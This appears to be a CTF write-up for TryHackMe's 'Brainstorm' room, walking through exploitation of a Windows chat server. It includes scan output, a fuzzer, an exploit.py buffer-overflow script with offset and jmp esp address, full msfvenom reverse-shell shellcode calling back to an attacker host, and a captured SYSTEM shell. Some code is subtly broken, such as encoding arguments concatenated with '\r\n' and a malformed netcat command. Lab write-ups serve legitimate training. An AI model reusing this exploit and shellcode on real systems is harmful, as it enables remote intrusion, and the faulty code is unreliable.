Brainstorm
===========

Brainstorm is a CTF on https://tryhackme.com/

Buffer Overflow
=================

    - We Fuzz the executable.
    - We crash the app and get control of the EIP.
    - We locate the bad characters
    - We find and select a Jump Point
    - We then generate our payload code
    - We make sure to add our NOP sleds.
    - We exploit.

Port Scanning
=============

     Threader 3000 - Multi-threaded Port Scanner          
                       Version 1.0.7                    
                   A project by The Mayor               
    ------------------------------------------------------------
    Enter your target IP address or URL here: 10.10.190.239
    ------------------------------------------------------------
    Scanning target 10.10.190.239
    Time started: 2022-10-10 23:13:36.657537
    ------------------------------------------------------------
    Port 21 is open
    Port 3389 is open
    Port 9999 is open
    Port scan completed in 0:01:41.119244
    ------------------------------------------------------------
    Threader3000 recommends the following Nmap scan:
    ************************************************************
    nmap -p21,3389,9999 -sV -sC -T4 -Pn -oA 10.10.190.239 10.10.190.239
    ************************************************************
    Would you like to run Nmap or quit to terminal?
    ------------------------------------------------------------
    1 = Run suggested Nmap scan
    2 = Run another Threader3000 scan
    3 = Exit to terminal
    ------------------------------------------------------------
    Option Selection: 1
    nmap -p21,3389,9999 -sV -sC -T4 -Pn -oA 10.10.190.239 10.10.190.239
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-10 23:16 BST
    Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
    Service scan Timing: About 33.33% done; ETC: 23:17 (0:00:12 remaining)
    Nmap scan report for 10.10.190.239
        Host is up (0.024s latency).
    PORT     STATE SERVICE            VERSION
    21/tcp   open  ftp                Microsoft ftpd
    | ftp-anon: Anonymous FTP login allowed (FTP code 230)
    |_Can't get directory listing: TIMEOUT
    | ftp-syst: 
    |_  SYST: Windows_NT
    3389/tcp open  ssl/ms-wbt-server?
    | rdp-ntlm-info: 
    |   Target_Name: BRAINSTORM
    |   NetBIOS_Domain_Name: BRAINSTORM
    |   NetBIOS_Computer_Name: BRAINSTORM
    |   DNS_Domain_Name: brainstorm
    |   DNS_Computer_Name: brainstorm
    |   Product_Version: 6.1.7601
    |_  System_Time: 2022-10-10T22:19:38+00:00
    |_ssl-date: 2022-10-10T22:20:08+00:00; 0s from scanner time.
    | ssl-cert: Subject: commonName=brainstorm
    | Not valid before: 2022-10-09T20:35:36
    |_Not valid after:  2023-04-10T20:35:36
    9999/tcp open  abyss?
    | fingerprint-strings: 
    |   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
    |     Welcome to Brainstorm chat (beta)
    |     Please enter your username (max 20 characters): Write a message:
    |   NULL: 
    |     Welcome to Brainstorm chat (beta)
    |_    Please enter your username (max 20 characters):
    1 service unrecognized despite returning data.
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 190.50 seconds
    Segmentation fault
    ------------------------------------------------------------
    Combined scan completed in 0:06:32.706140

It seems like there is a strange server running on 9999 called brainstorm chat (beta), lets see what we can find with FTP.

Enumerating Port 21 - FTP
=========================

Lets connected to the Port and use the username : 'anonymous'

    ftp 10.10.190.239
    Connected to 10.10.190.239.
    220 Microsoft FTP Service
    Name (10.10.190.239:sloppy): anonymous
    331 Anonymous access allowed, send identity (e-mail name) as password.
    Password: 
    230 User logged in.
    Remote system type is Windows_NT.
    ftp> passive off
    Passive mode: off; fallback to active mode: off.
    ftp> dir
    200 EPRT command successful.
    125 Data connection already open; Transfer starting.
    08-29-19  08:36PM       <DIR>          chatserver
    226 Transfer complete.
    ftp> cd chatserver
    250 CWD command successful.
    ftp> binary
    200 Type set to I.
    ftp> ls
    200 EPRT command successful.
    125 Data connection already open; Transfer starting.
    08-29-19  10:26PM                43747 chatserver.exe
    08-29-19  10:27PM                30761 essfunc.dll
    226 Transfer complete.
    ftp> get chatserver.exe
    local: chatserver.exe remote: chatserver.exe
    200 EPRT command successful.
    125 Data connection already open; Transfer starting.
    100% |***********************************************************************************************************************************************************************************************| 43747      254.47 KiB/s    00:00 ETA
    226 Transfer complete.
    43747 bytes received in 00:00 (254.27 KiB/s)
    ftp> get essfunc.dll
    local: essfunc.dll remote: essfunc.dll
    200 EPRT command successful.
    125 Data connection already open; Transfer starting.
    100% |***********************************************************************************************************************************************************************************************| 30761      294.75 KiB/s    00:00 ETA
    226 Transfer complete.
    30761 bytes received in 00:00 (294.27 KiB/s)

Side note - I had alot of trouble with passive mode, make sure you disable before trying to run commands.

    passive off

Mona Config / Immunity Debugger
================================

Now that we have the Files we can transfer both files to the Windows 7 VM that has immunity Debugger.

    Right-click the Immunity Debugger icon on the Windows 7 VM and choose "Run as administrator".

I use the mona script, however to make it easier to work with, you should configure a working folder using the following command, which you can run in the command input box at the bottom of the Immunity Debugger window:

    !mona config -set workingfolder c:\mona\%p

The latest version can be downloaded here: https://github.com/corelan/mona

Open the chatserver.exe and have a look at how it functions

On your Kali box, connect to port 9999 on 192.168.133.131 using netcat: 

    Welcome to Brainstorm chat (beta)
    Please enter your username (max 20 characters): Dale
    Write a message: Test random message

Fuzzing
=======

The following Python script can be modified and used to fuzz remote entry points to an application. It will send increasingly long buffer strings in the hope that one eventually crashes the application.

    #!/usr/bin/env python3
    import socket, time, sys

    ip = "192.168.133.131"
    port = 9999
    timeout = 5

    # Create an array of increasing length buffer strings.
    buffer = ['A']
    counter = 100
    while len(buffer) < 30:
        buffer.append("A" * counter)
        counter += 100

    for string in buffer:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            connect = s.connect((ip, port))
            s.recv(1024)
            print("Fuzzing with %s bytes" % len(string))
            s.send(bytes("Fuzz ", "latin-1" + "\r\n"))
            s.recv(1024)
            s.send(bytes(string, "latin-1"  + "\r\n"))
            s.recv(1024)
            s.close()
        except:
            print("Could not connect to " + ip + ":" + str(port))
            sys.exit(0)
        time.sleep(1)

The fuzzer will send increasingly long strings comprised of A's. If the fuzzer crashes the server with one of the strings, the fuzzer should exit with an error message. Make a note of the largest number of bytes that were sent.

    Run the fuzzer.py script using python: python3 fuzzer.py

Crash Replication & Controlling EIP
===================================

Create another file on your Kali box called exploit.py with the following contents:

    import socket
    
    ip = "10.10.70.232"
    port = 9999

    prefix = "user "
    offset = 0
    overflow = "A" * offset
    retn = ""
    padding = ""
    payload = ""
    postfix = ""

    buffer = overflow + retn + padding + payload + postfix

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
            connect = s.connect((ip, port))
            s.recv(1024)
            print("Sending evil buffer...")
            s.send(bytes(prefix, "latin-1"  + "\r\n"))
            s.recv(1024)
            s.send(bytes(buffer, "latin-1"  + "\r\n"))
            print("Done!")
    except:
            print("Could not connect.")

Using the buffer length which caused the crash, generate a unique buffer so we can determine the offset in the pattern which overwrites the EIP register, and the offset in the pattern to which other registers point. Create a pattern that is 400 bytes larger than the crash buffer, so that we can determine whether our shellcode can fit immediately. If the larger buffer doesn't crash the application, use a pattern equal to the crash buffer length and slowly add more to the buffer to find space.

Fuzzing crashed at 2100 bytes

    msf-pattern_create -l 2500 (400 More than fuzzer crashed)                                                                                      
    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2D

On Windows, in Immunity Debugger, re-open the chatserver.exe again using the same method as before, and click the red play icon(twice) to get it running. You will have to do this prior to each time we run the exploit.py (which we will run multiple times with incremental modifications).

While the unique buffer is on the stack, use mona's findmsp command, with the distance argument set to the pattern length.

    !mona findmsp -distance 2500
    ...
    [+] Looking for cyclic pattern in memory
    EIP contains normal pattern : 0x31704330 (offset 2012)

Equally you can also use msf-pattern_offeset

    msf-pattern_offset -q 31704330
    [] Exact match at offset 2012

Now lets Create a new buffer using this information to ensure that we can control EIP:

Update your exploit.py script and set the offset variable to this value (was previously set to 0). Set the payload variable to an empty string again. Set the retn variable to "BBBB".

    prefix = "user "
    offset = 2012
    overflow = "A" * offset
    retn = "BBBB"
    padding = ""
    payload = ""
    postfix = ""
    
    buffer = overflow + retn + padding + payload + postfix

Crash the application using this buffer, and make sure that EIP is overwritten by B's (\\x42)e.g. 42424242.

Finding Bad Characters
======================

Generate a bytearray using mona, and exclude the null byte (\\x00) by default. Note the location of the bytearray.bin file that is generated.

    !mona bytearray -b "\x00"

Now generate a string of bad chars that is identical to the bytearray. The following python script can be used to generate a string of bad chars from \\x01 to \\xff:

    from __future__ import print_function

    for x in range(1, 256):
        print("\\x" + "{:02x}".format(x), end='')

    print()

Crash the application using this buffer, and make a note of the address to which ESP points. This can change every time you crash the application, so get into the habit of copying it from the register each time.

Use the mona compare command to reference the bytearray you generated, and the address to which ESP points:

    !mona compare -f C:\mona\chatserver\bytearray.bin -a <address>

We take note of the badchars returned:

    “Unmodified” (This indicates that no more badchars exist)

The first badchar in the list should be the null byte (\x00) since we already removed it from the file. 

Find a Jump Point
=================

The mona jmp command can be used to search for jmp (or equivalent) instructions to a specific register. The jmp command will, by default, ignore any modules that are marked as aslr or rebase.

The following example searches for "jmp esp" or equivalent (e.g. call esp, push esp; retn, etc.) while ensuring that the address of the instruction doesn't contain the bad chars \\x00, \\x0a, and \\x0d.

    !mona jmp -r esp -cpb "\x00"

Choose an address and update your exploit.py script, setting the “retn” variable to the address, written backwards. For example if the address is \x01\x02\x03\x04 in Immunity, write it as \x04\x03\x02\x01 in your exploit.

    Our address is 625014df so our retn = "\xdf\x14\x50\x62"

Generate Payload
================

Generate a reverse shell payload using msfvenom, making sure to exclude the same bad chars that were found previously:

    msfvenom -p windows/shell_reverse_tcp LHOST=10.18.91.23 LPORT=4444 EXITFUNC=thread -b "\x00" -f py

    buf =  ""
    buf += "\xda\xc0\xd9\x74\x24\xf4\x5a\xbb\x92\x97\x91\x3d"
    buf += "\x2b\xc9\xb1\x52\x31\x5a\x17\x03\x5a\x17\x83\x78"
    buf += "\x6b\x73\xc8\x80\x7c\xf6\x33\x78\x7d\x97\xba\x9d"
    buf += "\x4c\x97\xd9\xd6\xff\x27\xa9\xba\xf3\xcc\xff\x2e"
    buf += "\x87\xa1\xd7\x41\x20\x0f\x0e\x6c\xb1\x3c\x72\xef"
    buf += "\x31\x3f\xa7\xcf\x08\xf0\xba\x0e\x4c\xed\x37\x42"
    buf += "\x05\x79\xe5\x72\x22\x37\x36\xf9\x78\xd9\x3e\x1e"
    buf += "\xc8\xd8\x6f\xb1\x42\x83\xaf\x30\x86\xbf\xf9\x2a"
    buf += "\xcb\xfa\xb0\xc1\x3f\x70\x43\x03\x0e\x79\xe8\x6a"
    buf += "\xbe\x88\xf0\xab\x79\x73\x87\xc5\x79\x0e\x90\x12"
    buf += "\x03\xd4\x15\x80\xa3\x9f\x8e\x6c\x55\x73\x48\xe7"
    buf += "\x59\x38\x1e\xaf\x7d\xbf\xf3\xc4\x7a\x34\xf2\x0a"
    buf += "\x0b\x0e\xd1\x8e\x57\xd4\x78\x97\x3d\xbb\x85\xc7"
    buf += "\x9d\x64\x20\x8c\x30\x70\x59\xcf\x5c\xb5\x50\xef"
    buf += "\x9c\xd1\xe3\x9c\xae\x7e\x58\x0a\x83\xf7\x46\xcd"
    buf += "\xe4\x2d\x3e\x41\x1b\xce\x3f\x48\xd8\x9a\x6f\xe2"
    buf += "\xc9\xa2\xfb\xf2\xf6\x76\xab\xa2\x58\x29\x0c\x12"
    buf += "\x19\x99\xe4\x78\x96\xc6\x15\x83\x7c\x6f\xbf\x7e"
    buf += "\x17\x9a\x52\xdb\xf0\xf2\x50\xdb\xef\x5e\xdc\x3d"
    buf += "\x65\x4f\x88\x96\x12\xf6\x91\x6c\x82\xf7\x0f\x09"
    buf += "\x84\x7c\xbc\xee\x4b\x75\xc9\xfc\x3c\x75\x84\x5e"
    buf += "\xea\x8a\x32\xf6\x70\x18\xd9\x06\xfe\x01\x76\x51"
    buf += "\x57\xf7\x8f\x37\x45\xae\x39\x25\x94\x36\x01\xed"
    buf += "\x43\x8b\x8c\xec\x06\xb7\xaa\xfe\xde\x38\xf7\xaa"
    buf += "\x8e\x6e\xa1\x04\x69\xd9\x03\xfe\x23\xb6\xcd\x96"
    buf += "\xb2\xf4\xcd\xe0\xba\xd0\xbb\x0c\x0a\x8d\xfd\x33"
    buf += "\xa3\x59\x0a\x4c\xd9\xf9\xf5\x87\x59\x19\x14\x0d"
    buf += "\x94\xb2\x81\xc4\x15\xdf\x31\x33\x59\xe6\xb1\xb1"
    buf += "\x22\x1d\xa9\xb0\x27\x59\x6d\x29\x5a\xf2\x18\x4d"
    buf += "\xc9\xf3\x08"
    payload =buf
    
Note this does come with the prefix 'b' however I removed this and kept it as a string 

Prepend NOPs
============

If an encoder was used (more than likely if bad chars are present, remember to prepend at least 20 NOPs (\\x90) to the payload.

    padding = "\x90" * 20

Final Buffer (Exploit)
============

With the correct prefix, offset, return address, padding, and payload set, you can now exploit the buffer overflow to get a reverse shell. Start a netcat listener on your Kali box using the LPORT you specified in the msfvenom command

    nc - lvnp 4444
    listening on [any] 4444 ...

Restart chatserver.exe in Immunity and run the modified exploit.py script again. Your netcat listener should catch a reverse shell!

    connect to [10.18.91.23] from (UNKNOWN) [10.10.82.44] 49165
    Microsoft Windows [Version 6.1.7601]
    Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

    C:\Windows\system32>whoami
    whoami
    nt authority\system
    
Thank you, hope you enjoed this, and please feel free to give me any advice or guidance on how to do it better!
